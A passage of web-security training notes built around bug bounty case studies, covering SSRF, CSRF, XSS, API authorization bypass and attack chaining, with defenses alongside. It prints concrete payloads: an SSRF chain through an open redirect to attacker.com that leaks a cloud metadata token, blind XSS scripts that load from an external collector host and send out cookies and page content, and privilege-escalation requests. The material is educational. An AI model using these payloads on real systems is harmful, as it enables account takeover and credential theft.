• URI  <a href="https://api.vimeo.com/">https://api.vimeo.com/users/1122/videos/../../../</a>
• Result  <a href="https://api.vimeo.com/">https://api.vimeo.com/</a></li>
</ul>
<p><a href="https://api.vimeo.com/m/something">https://api.vimeo.com/m/something</a>
redirects to  <a href="https://vimeo.com/something">https://vimeo.com/something</a></p>
<p>There is also an Open Redirect bug:
<a href="https://vimeo.com/vulnerable/something?redirect=https://attacker.com">https://vimeo.com/vulnerable/something?redirect=https://attacker.com</a>
redirects to  <a href="https://attacker.com/">https://attacker.com</a></p>
<p>FINAL PAYLOAD</p>
<ul>
<li>Input  video_id: ../../../m/vulnerable/something?redirect=https://attacker.com</li>
<li>URI to be parsed  <a href="https://api.vimeo.com/m/vulnerable/">https://api.vimeo.com/users/1122/videos/../../../m/vulnerable/</a>
something?redirect?url=https://attacker.com</li>
<li>Parsing result <a href="https://api.vimeo.com/m/vulnerable/something?redirect=https://attacker.com">https://api.vimeo.com/m/vulnerable/something?redirect=https://attacker.com</a></li>
<li>HTTP redirection <a href="https://vimeo.com/vulnerable/something?redirect=https://attacker.com">https://vimeo.com/vulnerable/something?redirect=https://attacker.com</a></li>
<li>HTTP redirection  <a href="https://attacker.com/">https://attacker.com</a></li>
</ul>
<h4 id="forged-request-to-attack-server">FORGED REQUEST TO ATTACK SERVER</h4>
<p>💡 The attacker server screen shows a simple file attacker,json hosting static data. Then, video_id is filled with the following payload:
<code>../../../m/vulnerable/something?redirect=https://attacker.com/attacker.json</code></p>
<h4 id="retrieve-secret-access-token">RETRIEVE SECRET ACCESS TOKEN</h4>
<p>💡 Input: Replaced <a href="https://attacker/">https://attacker</a> with <a href="http://metadata.google.internal/computeMetadata/v1beta1/instance/service">http://metadata.google.internal/computeMetadata/v1beta1/instance/service</a>accounts/default/token?alt=json</p>
<ul>
<li>Response: Disclosed service of Google cloud account for Vimeo infrastructure</li>
</ul>
<hr>
<h1 id="cross-site-request-forgery">Cross-Site Request Forgery</h1>
<h4 id="csrf-normal-scenario">CSRF: NORMAL SCENARIO</h4>
<p>💡 Assume we have an app that allows an admin user to manage accounts. The admin user has the privilege to add/remove users. The slide shows a sample HTTP request that can be sent to add the user Joe.</p>
<p>It is a POST request sent with a valid session cookie. The body parameters include the user Joe, the password pass123 and the role Normal. Once the app receives such HTTP request, the app will add the user.</p>
<h4 id="csrf-attack-scenario">CSRF: ATTACK SCENARIO</h4>
<p>💡 1- Hosts a form that crafts the forged request
2- Admin got tricked to load attacker’s form
3- Browser will send the victim cookie automatically
4- POST /addUser
Cookie: Session ID
User: attacker
Pass: pass123
Role: admin
5- Admin wants to add the user attacker</p>
<h4 id="csrf-discovery">CSRF DISCOVERY</h4>
<p>💡 Search for requests that perform critical actions in the app and consider the following questions:
• Does the app check on any values in the headers, URI, and body?
• Are such values predictable? Can they be crafted by an attacker?
• Does the action need multiple requests to be sent in order to be committed?
• What is the request type (GET, POST, PUT&hellip;)?
• Was the cookie set with SameSite attribute?
<a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie/SameSite">SameSite cookies - HTTP | MDN (mozilla.org)</a></p>
<h4 id="csrf-defenses">CSRF: DEFENSES</h4>
<p>💡 Apps defend by adding another layer of authenticity other than the session id. This could be <strong>anti-CSRF tokens</strong>, <strong>passwords</strong>, and <strong>OTP</strong>. Anti-CSRF tokens are random values that are generated by the server and linked with the user session id. Such token value could be passed in custom header, URL, or body parameters.
<a href="https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html">Cross-Site Request Forgery Prevention - OWASP Cheat Sheet Series</a></p>
<h4 id="anti-csrf-tokens-implementation">ANTI-CSRF TOKENS IMPLEMENTATION</h4>
<p>💡 It is very common that apps don’t properly implement anti-CSRF tokens:</p>
<p>App checks that the anti-CSRF token exists, but doesn’t check if the value of the token is a
valid one that is generated by the server.</p>
<ul>
<li>App checks that the anti-CSRF token is valid, but does not verify that it is attached with
the session id passed in the request</li>
<li>Anti-CSRF token is set in the cookie only.</li>
<li>Anti-CSRF token is disclosed in an unauthenticated response that doesn’t require authentication</li>
<li>App accepts interchangeable GET and POST requests while checking on anti-CSRF tokens in
POST requests only.</li>
</ul>
<h4 id="bug-bounty-case-study-5">BUG BOUNTY CASE STUDY</h4>
<p>💡 <strong>Vulnerability allowed Pinterest account takeover
INTERESTING REQUEST</strong></p>
<p><code>POST /_ngjs/resource/UserSettingsResource/update/ HTTP/1.1 Host: [www.pinterest.com](http://www.pinterest.com/) Content‐Type: application/x‐www‐form‐urlencoded X‐CSRFToken: &lt;CSRF Token&gt; Cookie: &lt;Session ID&gt; …….. &lt;POST Parameters&gt;</code>
MISSING CHECK IN GET
When the request is vhanged from <code>POST</code> to <code>GET</code> , the app did NOT verify on the header token
<strong>ACCOUNT TAKEOVER</strong></p>
<p>Once the victim clicks on the link while being logged in, the email of victim user will be changed to <a href="mailto:anytestemail@user.com">anytestemail@user.com</a></p>
<hr>
<h1 id="reflected-xss">Reflected XSS</h1>
<h4 id="reflected-xss-1">REFLECTED XSS</h4>
<p>💡 1- Attacker tricks victim to send a request filled with malicious JavaScript
2- <code>GET /search?word=&lt;script&gt;alert(123)&lt;/script&gt;</code>
The response will be rendered as follows:
<code>&lt;p&gt;Search results for &lt;script&gt;alert(123)&lt;/script&gt;&lt;/p&gt;</code></p>
<h4 id="bug-bounty-case-study-6">BUG BOUNTY CASE STUDY</h4>
<p>💡 <a href="https://ws-na.amazon">https://ws-na.amazon</a><a href="http://adsystem.com/widgets/q?ServiceVersion=20070822&amp;OneJS=1&amp;Operation=GetAdH">adsystem.com/widgets/q ServiceVersion=20070822&amp;OneJS=1&amp;Operation=GetAdH</a>
tml&amp;MarketPlace=US&amp;source=ss&amp;ref=as_ss_li_til&amp;ad_type=product_link&amp;tracking
_id=jgsbookselection&rdquo;&gt;&lt;script/k/&gt;alert(1)&lt;/script/k/&gt;&amp;marketplace=amazon&amp;r
egion=US&amp;placement=1449319432&amp;asins=1449319432&amp;linkId=cc38d5883c3f92bbe
b69b93a6810322a&amp;show_border=true&amp;link_opens_in_new_window=true
<a href="https://medium.com/@newp_th/reflected-xss-on-ws-na-amazon-adsystem-com-amazon-f1e55f1d24cf">Reflected XSS on ws-na.amazon-adsystem.com(Amazon) | by newp_th | Medium</a></p>
<hr>
<h1 id="stored-xss">STORED XSS</h1>
<p>💡 1- <code>POST /updateComment Session ID comment: JavaScript code commentId: 5</code></p>
<p>2- App inserts
JavaScript code in
the database and
retrieves it back
4- JavaScript code is rendered</p>
<h4 id="stored-xss-bug-bounty-case-study">STORED XSS BUG BOUNTY CASE STUDY</h4>
<p>💡 <a href="https://hackerone.com/reports/391390">**HackerOne</a>
Create store and add a member in a store
Member changes his/her name with hunter&rdquo;&gt;
Admin visits the activity page, and the malicious payload works**</p>
<hr>
<h1 id="tracing-the-data-flow">TRACING THE DATA FLOW</h1>
<p>💡 Trace the app data flow to understand how the app accepts inputs and where does it return it back in the output
<a href="https://portswigger.net/web-security/cross-site-scripting/contexts">Cross-site scripting contexts | Web Security Academy (portswigger.net)</a></p>
<hr>
<h1 id="xss-defenses">XSS DEFENSES</h1>
<h4 id="input-validation">Input Validation</h4>
<p>💡 Block malicious input from coming in by either allowing only known good (whitelist)
or filtering out known bad (blacklist)
Whitelist can be constraining while blacklist technique can miss malicious input</p>
<h4 id="output-encoding">Output Encoding</h4>
<p>💡 Allow Malicious input to come in but encode it and convert it into data when rendering the response
Examples for HTML encode: &lt;  &lt; &gt;  &gt; &quot;  &quot;
Proper encoding depends on the context.</p>
<h4 id="example-defense">EXAMPLE DEFENSE</h4>
<p>💡 <a href="https://ws-na.amazon-adsystem.com/widgets/q">https://ws-na.amazon-adsystem.com/widgets/q</a>?
ServiceVersion=20070822&amp;OneJS=1&amp;Operation=GetAdHtml&amp;MarketPlace=US&amp;source=ss&amp;ref=as_ss_li_til&amp;ad_type=product_link&amp;tracking_id=1 &ldquo;<code>-confirm(1)-</code>&quot;&amp;marketplace=amazon&amp;region=US&amp;placement= 1449319432&amp; asins=1449319432&amp;linkId=cc38d5883c3f92bbeb69b93a6810322a &amp; show_border= true&amp;link_opens_in_new_window=true#</p>
<p>// its now fixed by encoding</p>
<h4 id="stored-xss-bug-bounty-case-study-1">STORED XSS BUG BOUNTY CASE STUDY</h4>
<p>💡 <strong>Stored XSS vulnerability is discovered in Google Cloud Console.</strong>
<a href="https://blog.it-securityguard.com/bugbounty-sleeping-stored-google-xss-awakens-a-5000-bounty/">[BugBounty] Sleeping stored Google XSS Awakens a $5000 Bounty | Patrik Fehrenbach (it-securityguard.com)</a></p>
<ul>
<li>Create a project with the name <code>“&gt;&lt;img src=x  onerro=prompt(1);&gt;</code></li>
<li>Payload is returned without encoding when deleting the project</li>
</ul>
<hr>
<h1 id="blind-xss">BLIND XSS</h1>
<p>💡 1- <code>POST /updateAddress Host: RetailBank street: JavaScript code</code>
2- Retail banking app inserts JavaScript code in the database
3- <code>GET /reviewRequests Host: Backoffice</code>
4- Backoffice App returns JavaScript code to the manager
5- JavaScript code is rendered</p>
<h4 id="discovering-blind-xss">DISCOVERING BLIND XSS</h4>
<p>💡 The challenge is that the attack payload script can be rendered in an app that we don’t have access to.</p>
<p>We can inject a script that refers to our attack server and check the logs. 
Example attack payloads include:
• XSS Hunter
<code>&lt;script src=//yoursubdomain.xss.ht&gt;&lt;/script&gt;</code>
• Burp Collaborator
<code>&lt;script src= [//RANDOM-VALUE.burpcollaborator.net](notion://random-value.burpcollaborator.net/) &gt;&lt;/script&gt;</code></p>
<h4 id="xss-hunter">XSS Hunter</h4>
<p>💡 When a blind XSS payload is triggered, you will have access to information such as the user agent, cookies possibly including a session token, and more
<a href="https://xsshunter.com/">XSS Hunter</a> 
<a href="https://github.com/mandatoryprogrammer/xsshunter">https://github.com/mandatoryprogrammer/xsshunter</a></p>
<h4 id="blind-xss-bug-bounty-case-study">BLIND XSS BUG BOUNTY CASE STUDY</h4>
<p>💡 <strong>Stored XSS vulnerability is discovered</strong>
<a href="https://samcurry.net/cracking-my-windshield-and-earning-10000-on-the-tesla-bug-bounty-program/">Cracking my windshield and earning $10,000 on the Tesla Bug Bounty Program | Sam Curry</a>
Script payload is injected in the nickname. Once the script is rendered in an internal Tesla
website, it will refer to XSS Hunter server
<code>&quot;&gt;&lt;script src=//zlz.xss.ht&gt;&lt;/script&gt;</code>
<strong>EXPLOIT WORKED</strong></p>
<p>Vulnerable Page URL
<a href="https://redacted.teslamotors.com/redacted/5057517/redacted">https://redacted.teslamotors.com/redacted/5057517/redacted</a>
Referer
<a href="https://redacted.teslamotors.com/redacted/5YJ31337">https://redacted.teslamotors.com/redacted/5YJ31337</a></p>
<p><strong>PAGE CONTENT</strong>
Script worked in one of the pages of dashboard used for pulling managing Tesla vehicles.
• The script sent the content of the page to the attack server.
• Information revealed details of the car’s researcher</p>
<hr>
<h1 id="defense-bypass">DEFENSE BYPASS</h1>
<h4 id="improper-defense-bypass-example">IMPROPER DEFENSE BYPASS EXAMPLE</h4>
<p>💡 <strong>App Defenses:</strong>
• Blacklists on &lt; &gt; &quot; ;
• Performs HTML encoding for the output
<strong>Context:</strong> 
• Input: <code>/search?word=test</code>
• Output: <code>&lt;input type=’text’ onclick=”searchFunc(”test”)”/&gt;</code>
<strong>Bypassing Defenses:</strong>
• Only the following characters are needed &rsquo; , //
• Browser will perform HTML decoding when the context is HTML event attribute
<strong>Attack Payload:</strong>
• Input: <code>/search?word='),alert(123)//</code>
• Output: <code>input type='text' onclick=&quot;searchFunc(''),alert(123)//')&quot;/&gt;</code></p>
<h4 id="reflected-xss-bug-bounty-case-study">REFLECTED XSS BUG BOUNTY CASE STUDY</h4>
<p>💡 <strong>The researcher could bypass Web Application Firewall to exploit reflected XSS</strong>
<a href="https://medium.com/@jonathanbouman/reflected-xss-at-philips-com-e48bf8f9cd3c">Reflected XSS at Philips.com. A full write-up; reflected XSS was… | by Jonathan Bouman | Medium</a></p>
<ul>
<li>HTML tags are encoded</li>
<li>Adobe DTM indicates that Adobe Experience Manager is the CMS</li>
<li>Adding <code>?debug=layout</code> will show components details of visited URL
<a href="https://www.philips.nl/%3Ch1%3EWaldo%3C/h1%3E?debug=layout">https://www.philips.nl/<!-- raw HTML omitted -->Waldo<!-- raw HTML omitted -->?debug=layout</a> ⇒ No output encoding</li>
<li>Injected JavaScript payload was blocked by <strong>WAF</strong></li>
</ul>
<h4 id="filtering-analysis">FILTERING ANALYSIS</h4>
<p>💡 - WAF blocks the <!-- raw HTML omitted --> tag and allows the <!-- raw HTML omitted --> tag</p>
<ul>
<li>The WAF blocks almost all the JavaScript events (i.e. <code>onerror</code>, <code>onload</code>,..), but allows the use of the <code>onpointerenter</code> event.</li>
<li>The WAF blocks the string https:// in the path</li>
<li>The application is using jQuery
<strong>WAF BYPASS</strong></li>
</ul>
<p><a href="https://www.philips.nl/healthcare/">https://www.philips.nl/healthcare/</a><!-- raw HTML omitted -->?debug=layout</p>
<hr>
<h1 id="api-attacks">API Attacks</h1>
<h4 id="client-side-code-and-apis">CLIENT-SIDE CODE AND APIS</h4>
<p>💡 Sends request, parses response and renders page</p>
<pre tabindex="0"><code>GET /api/users/2156
Access Token
</code></pre><p>App processes request and returns JSON response</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{<span style="color:#f92672">&#34;[name&#34;</span>:<span style="color:#e6db74">&#34;Joe&#34;</span>,<span style="color:#f92672">&#34;email&#34;</span>:<span style="color:#960050;background-color:#1e0010">joe@Joe.com](mailto</span>:<span style="color:#960050;background-color:#1e0010">name%</span><span style="color:#ae81ff">22</span>:<span style="color:#960050;background-color:#1e0010">%</span><span style="color:#ae81ff">22</span><span style="color:#960050;background-color:#1e0010">Joe%</span><span style="color:#ae81ff">22</span>,<span style="color:#960050;background-color:#1e0010">%22email%22:joe@Joe.com),</span> <span style="color:#f92672">&#34;profile&#34;</span>:<span style="color:#e6db74">&#34;Manager&#34;</span>}
</span></span></code></pre></div><h4 id="apis-attack-surface">APIS ATTACK SURFACE</h4>
<p>💡</p>
<ul>
<li>Many researchers don’t focus on APIs, although it is a rich attack surface.</li>
<li>Mostly REST APIs serving Web apps, Mobile Apps, third-party apps.</li>
<li>It is very common that apps trust the client-side code in sending the request without being manipulated by attackers</li>
<li>Mapping the APIs URIs requires inspecting traffic, client-side code analysis or reading the API reference, if available</li>
<li>API access tokens can be acquired by either intercepting the requests sent after authentication, or by registering as a developer to access a feature that issues access tokens
<a href="https://www.facebook.com/notes/facebook-bug-bounty/security-testing-for-mobile-apps-made-easy/2528930930454451/">https://www.facebook.com/notes/facebook-bug-bounty/security-testing-for-mobile-apps-made-easy/2528930930454451/</a></li>
</ul>
<h4 id="api-authentication-bypass-attack">API AUTHENTICATION BYPASS ATTACK</h4>
<p>💡 <strong>NORMAL SCENARIO (1)</strong>
JavaScript code checks on the value of Status in the JSON response</p>
<pre tabindex="0"><code>POST /api/login
{&#34;Uname&#34;:&#34;jsmith&#34;,&#34;Upass&#34;:&#34;Demo123&#34;}
App checks on user/pass and replies with a JSON
{&#34;Status&#34;:&#34;SUCCESS&#34;,&#34;uid&#34;:&#34;3892&#34;,&#34;role&#34;:&#34;normal&#34;}
</code></pre><p>💡 <strong>NORMAL SCENARIO (2)</strong>
If value of Status is a SUCCESS, a request will be sent to load user info without any access tokens</p>
<pre tabindex="0"><code>GET /api/users/3892
App retrieves user info
`{&#34;name&#34;:&#34;John Smith&#34;, &#34;Phone&#34;:&#34;123-456&#34;, &#34;[email&#34;:&#34;joe@joe.com](mailto:email%22:%22joe@joe.com)&#34;}
</code></pre><p>💡 <strong>AUTHENTICATION BYPASS: OPTION 1</strong>
Pass incorrect credentials and intercept the response</p>
<pre tabindex="0"><code>POST /api/login
{&#34;Uname&#34;:&#34;Blah&#34;,&#34;Upass&#34;:&#34;Blah&#34;}
App checks on user/pass and replies with a JSON
{&#34;Status&#34;:&#34;Fail&#34;,&#34;ErrCode&#34;: &#34;1&#34;} ⇒ Response Manpulation {&#34;Status&#34;:&#34;Success&#34;,&#34;uid&#34;:
&#34;jsmith&#34;,“uid&#34;:&#34;3892&#34;}
</code></pre><p>💡 <strong>AUTHENTICATION BYPASS: OPTION 2 (1)</strong>
The attacker has another way here to perform authentication bypass. The attacker will navigate to the <code>/main</code> page normally through a browser and let the JavaScript code load. The attacker will then analyze the JavaScript code. By looking into the code, the attacker notices that jQuery framework is being used to initiate HTTP requests</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">loadUserDetails</span>(<span style="color:#a6e22e">uid</span>)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">options</span> <span style="color:#f92672">=</span> {
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">url</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;https://&#39;</span> <span style="color:#f92672">+</span> window.<span style="color:#a6e22e">location</span>.<span style="color:#a6e22e">host</span> <span style="color:#f92672">+</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;/api/users/&#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">uid</span>,
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">type</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;GET&#39;</span>,
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">success</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">function</span>(<span style="color:#a6e22e">data</span>) {
</span></span><span style="display:flex;"><span><span style="color:#75715e">//JavaScript code that renders user info
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>}
</span></span><span style="display:flex;"><span>};
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">$</span>.<span style="color:#a6e22e">ajax</span>(<span style="color:#a6e22e">options</span>);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>💡 <strong>AUTHENTICATION BYPASS: OPTION 2 (2)</strong>
Crafts a request to the API while predicting the value of the numeric user id</p>
<pre tabindex="0"><code>GET /api/users/3892
App retrieves user info
{&#34;name&#34;:&#34;John [Smith&#34;,&#34;Phone&#34;:&#34;123-456&#34;,&#34;email&#34;:&#34;joe@joe.com](mailto:Smith%22,%22Phone%22:%22123-456%22,%22email%22:%22joe@joe.com)&#34;}
</code></pre><h4 id="apis-privilege-escalation">APIS PRIVILEGE ESCALATION</h4>
<p>💡 <strong>NORMAL SCENARIO</strong>
Users log in and update profile info, such as name, address and email&hellip;</p>
<pre tabindex="0"><code>POST /api/login
{&#34;Uname&#34;:&#34;joe&#34;,&#34;Upass&#34;:&#34;Test123&#34;}
{&#34;token&#34;:&#34;a16754372dab252&#34;}
</code></pre><pre tabindex="0"><code>PUT /api/users/3892
Authorization: a16754372dab252
{&#34;address&#34;:&#34;12 Lake st.,&#34;}
{&#34;success&#34;:&#34;true&#34;}
</code></pre><p>💡 <strong>PRIVILEGE ESCALATION</strong>
Crafts a PUT request to the API to update profile info and escalate to admin role</p>
<pre tabindex="0"><code>POST /api/login
{&#34;Uname&#34;:&#34;joe&#34;,&#34;Upass&#34;:&#34;Test123&#34;}

{&#34;token&#34;:&#34;a16754372dab252&#34;}
</code></pre><pre tabindex="0"><code>PUT /api/users/3892
Authorization: a16754372dab252
{&#34;address&#34;:“st. 123&#34;, &#34;role&#34;:&#34;admin`&#34;}
</code></pre><h4 id="api-attack-bounty-case-study">API ATTACK BOUNTY CASE STUDY</h4>
<p>💡 <strong>Vulnerability allowed API authorization bypass</strong>
<a href="https://www.freecodecamp.org/news/messing-with-the-google-buganizer-system-for-15-600-in-bounties-58f86cc9f9a5/">How I hacked Google’s bug tracking system itself for $15,600 in bounties</a>
<strong>GOOGLE ISSUE TRACKER</strong>
Google Issue Tracker is used to report functional or security bugs reported on Google applications
Unauthorized issue <code>ids</code> are passed to disclose restricted report info
Client-side code analysis can reveal API endpoints that are hidden or disabled in the interface</p>
<h4 id="smart-car-alarms-case-study">SMART CAR ALARMS CASE STUDY</h4>
<p>💡 <strong>Vulnerability in Smart car alarm that could allow car takeover</strong>
<a href="https://www.pentestpartners.com/security-blog/gone-in-six-seconds-exploiting-car-alarms/">Gone in six seconds? Exploiting car alarms | Pen Test Partners</a></p>
<p>Smart Alarm mobile app used to give alarms and controls car in case of robbery
Researchers <code>intercepted</code> requests between the mobile apps and the API</p>
<p><strong>VIPER VULNERABILITY</strong></p>
<p>An attacker can set password of any victim user by just knowing the user id. The attacker can use his/her session and send a request to the URI /users/Update/861772 while setting any value in the parameter password. Once the request is sent to the server,the app will change the password of the user whose id is 861772 to the value supplied in the password parameter.</p>
<p><strong>PANDORA VULNERABILITY</strong></p>
<p>The slide shows a request that attacks Pandora mobile app API. An attacker can set password of any victim user by just knowing the user id. The attacker can use his/her session and send a request to the URI /api/sputnik/workers?id=123 while setting any value in the parameter email.
Once the request is sent to the server, the app will change the email of the user whose id is 123 to the value supplied in the email parameter. The next step for the attacker is to visit the password reset feature and supply the email of the attacker and reset the password of the victim user</p>
<p>💡 <strong>ATTACK SCENARIO</strong></p>
<p><a href="https://labs.integrity.pt/articles/uber-hacking-how-we-found-out-who-you-are-where-you-are-and-where-you-went/">Uber Hacking: How we found out who you are, where you are and where you went!</a></p>
<p>Once the victim account is taken over, sensitive operation can be performed using the mobile app, such as unlocking the car doors and even killing the car engines</p>
<p>💡 <strong>API ATTACK BOUNTY CASE STUDY
Vulnerability allowed API authorization bypass</strong>
First, the researcher followed the steps in <a href="https://www.etsy.com/developers/documentation">https://www.etsy.com/developers/documentation</a> to acquire an API key in order to be able to call the Etsy API methods
<a href="https://openapi.etsy.com/v2/users/:user_id/transactions">https://openapi.etsy.com/v2/users/:user_id/transactions</a></p>
<ol>
<li>Authenticate to Etsy and acquire an access token that grants access to user data over Etsy</li>
<li>Access token is passed to the client app</li>
<li>App uses access token to access Etsy API</li>
</ol>
<p>A simple PHP app is developed to call the API method while following the guidelines at
<a href="https://www.etsy.com/developers/documentation/getting_started/oauth">https://www.etsy.com/developers/documentation/getting_started/oauth</a>.
A code snippet from the PHP app that uses OAuth will be like:</p>
<pre tabindex="0"><code>$data = $oauth-&gt;fetch(&#34;[https://openapi.etsy.com//](https://openapi.etsy.com//) v2/users/12345678/transactions&#34;, null,
OAUTH_HTTP_METHOD_GET);
$json = $oauth-&gt;getLastResponse(); print_r(json_decode($json, true));
</code></pre><p>Attacker will acquire an access token by any randomly created user but will use it to access transactions of other victim users by manipulating the user id parameter</p>
<pre tabindex="0"><code>GET / v2/users/12345678/transactions
Host: [openapi.etsy.com](http://openapi.etsy.com/)
Authorization: OAuth Access Token
</code></pre><p>💡 <strong>Vulnerability allowed Cross-Site Scripting</strong>
<a href="https://hassanhadary.blogspot.com/">Hassan El Hadary)</a></p>
<p>Cisco Meraki website at: <a href="https://meraki.cisco.com/">https://meraki.cisco.com/</a>.
It enables administrators to manage their organization networks over the web.</p>
<p><strong>INPUT DATA FLOW</strong>
Searched for places where data is inserted in a page and retrieved in another.
Change log section enables organization manager to view configuration changes performed by administrators</p>
<p><strong>CONFIGURATION CHANGE</strong>
Visited radio setting page where a user can change a network configuration.</p>
<p><strong>REQUEST SENT</strong></p>
<pre tabindex="0"><code>POST /abbas5/n/DBR9eax/manage/configure/update_radio
HTTP/1.1
Host: [n23.meraki.com](http://n23.meraki.com/)
[Other HTTP Headers]
authenticity_token=28nABCvKbZ0lQWehVH%2Bn0a8sHABCbs2zPRgSoo
nQZbE%3D&amp;node_group%5Bcountry_code%5D=DZ&amp;node_group%5Btxpow
*control%5D=off&amp;radio_changes=&amp;settings_change_hash={&#34;node*
group[country_code]&#34;:{&#34;label&#34;:&#34;Country&#34;,&#34;new_text&#34;:&#34;Algeria
&#34;,&#34;old_text&#34;:&#34;United States&#34;}}
</code></pre><p><strong>CHANGE LOG PAGE CONTEXT</strong></p>
<pre tabindex="0"><code>&lt;script type=&#39;text/javascript&#39;&gt;
var changes = [{&#34;new_text&#34;:&#34;America ‐
Belize&#34;,&#34;time&#34;:1365963215.47505,&#34;category&#34;:&#34;Network‐wide
settings&#34;,&#34;admin_name&#34;:&#34;hassan&#34;,&#34;meraki_admin_change&#34;:false
,&#34;time_str&#34;:&#34;Apr 14 18:13&#34;, &#34;[admin_email&#34;:&#34;test@gmail.com](mailto:admin_email%22:%22test@gmail.com)&#34;,
&#34;network_url_tag&#34;:&#34;abbas3&#34;, &#34;label&#34;:&#34;Local time
zone&#34;,&#34;network_encrypted_id&#34;:&#34;123HRcx&#34;,
&#34;network_name&#34;:&#34;abbas3&#34;,&#34;old_text&#34;:&#34;America ‐ Los
Angeles&#34;,&#34;ssid_name&#34;:null},....]
......
make_change_log_table(changes);
</code></pre><p><strong>ATTACK SCENARIO</strong>
Attacker will update the radio settings while using interception proxy</p>
<p><strong>XSS PAYLOAD</strong></p>
<pre tabindex="0"><code>POST /abbas5/n/DBR9eax/manage/configure/update_radio
HTTP/1.1
Host: [n23.meraki.com](http://n23.meraki.com/)
[Other HTTP Headers]
authenticity_token=28nABCvKbZ0lQWehVH%2Bn0a8sHABCbs2zPRgSoo
nQZbE%3D&amp;node_group%5Bcountry_code%5D=DZ&amp;node_group%5Btxpow
*control%5D=off&amp;radio_changes=&amp;settings_change_hash={&#34;node*
group[country_code]&#34;:{&#34;label&#34;:&#34;&lt;script&gt;alert(document.coo
kie)&lt;/script&gt;&#34;,&#34;new_text&#34;:&#34;Algeria&#34;,&#34;old_text&#34;:&#34;United
States&#34;}}
</code></pre><p>function &ldquo;make_change_log_ table&rdquo; read the contents of the &ldquo;changes&rdquo; variable and
rendered the value of the &ldquo;label&rdquo; item without escaping, causing the script to execute.</p>
<hr>
<h1 id="chaining-attacks">CHAINING ATTACKS</h1>
<p>💡 <strong>CHAINING ATTACKS
-</strong> In some bug bounty cases, we can have multiple bugs that don’t have much security
impact when exploited individually.</p>
<ul>
<li>Chaining different attacks can significantly increase the security impact of the bugs</li>
<li>Lots of combinations are possible depending on the app and the bug context.</li>
<li>We will discuss different examples that combine several attacks such as logic, CSRF,
XSS, Open Redirect, and enumeration</li>
</ul>
<h4 id="chaining-logic-with-self-xss">CHAINING LOGIC WITH SELF XSS</h4>
<p>💡 - Self XSS bug allows executing malicious script in the browser of the attacker, which is not
risky.</p>
<ul>
<li>Assume that an attacker can change his shop name to contain a script which returns back
unencoded in his shop details page; however, the page is accessible by the attacker only</li>
<li>If the attacker found a logic attack that allows editing the shop name of another victim
user, it will enable injecting a script in such shop name, allowing the script to work in a
different user’s context.</li>
</ul>
<h4 id="chaining-attack-bounty-case-study">CHAINING ATTACK BOUNTY CASE STUDY</h4>
<p>💡 <strong>Vulnerability allowed Stored Cross-Site Scripting chained with logic attack</strong></p>
<p>App that allows users to create gift cards <a href="https://www.giftcards.com/">Buy Gift Cards, eGift Cards, Visa &amp; Discount</a> 
Scenario starts with creating a gift card
Group Gift Manager allows modifying info of the created gift card
Start the wizard of editing gift card info
Modify the gift card id, and inject script in the input field data<code>[GroupGift][gift_for]</code>
Payload is returned in the response of another user, causing the script to work</p>
<ol>
<li>Authorization bypass that allows a user to edit gift card details of another user.</li>
<li>Self XSS vulnerability that works when updating the gift card details</li>
</ol>
<h2 id="chaining-enumeration-with-logic-attacks">Chaining enumeration with logic attacks</h2>
<p>💡 <strong>CHAINING ENUMERATION WITH LOGIC ATTACKS</strong></p>
<p>Assume we have an app that is vulnerable to a logic attack that works by manipulating an
unpredictable parameter: • ex: <code>UserId=abx2f4ac</code></p>
<p>Another enumeration bug allows disclosing the UserId value by supplying the first name of
the victim user: Input: Joe  Response: <code>abx2f4ac</code></p>
<p>Enumeration + Logic  High Security Impact Enumeration attack discloses <code>UserId</code> value and logic attack uses UserId to disclose user detailed info</p>
<h4 id="bug-bounty-case-study-7">BUG BOUNTY CASE STUDY</h4>
<p>💡 <strong>Vulnerability allowed account takeover of any Uber account.</strong>
<a href="https://medium.com/appsecure/how-i-could-have-hacked-your-uber-account-e98e64ab51bb">How your Uber account could have been hacked! | by Anand Prakash - PingSafe | Pingsafe</a></p>
<p><strong>UNPREDICTABLE PARAMETER VALUE</strong></p>
<p>Interesting user <code>uuid</code> parameter to change. However, the parameter is filled with unpredictable value. userUuid in a format like: <code>xxxx–776–4xxxx1bd861a-837xxx604ce</code>.</p>
<p><strong>REVEALING UUID BY PHONE</strong></p>
<p>Phone number passed in request parameter and <code>UUID is leaked in the response</code>
It can be revaild also with the email address
The vulnerable endpoint is: <a href="http://partners.uber.com/p3/fleet-manager/%5C_rpc?rpc=addDriverV2">partners.uber.com/p3/fleet-manager/_rpc?rpc=addDriverV2</a></p>
<p>Other interesting related bugs are available at:
<a href="https://labs.integrity.pt/articles/uber-hacking-how-we-found-out-who-you-are-where-you-are-and-where-you">https://labs.integrity.pt/articles/uber-hacking-how-we-found-out-who-you-are-where-you-are-and-where-you</a>went/
<a href="http://hassanhadary.blogspot.com/2014/03/authorization-bypass-google-orkut.html">http://hassanhadary.blogspot.com/2014/03/authorization-bypass-google-orkut.html</a><a href="https://about.fb.com/news/2018/09/security-update/#details">https://about.fb.com/news/2018/09/security-update/#details</a></p>
<h2 id="chaining-command-injection-with-cross-site-request-forgery">Chaining command injection with Cross-Site Request Forgery</h2>
<p>💡 <strong>Vulnerability allowed command injection when chained with CSRF</strong>
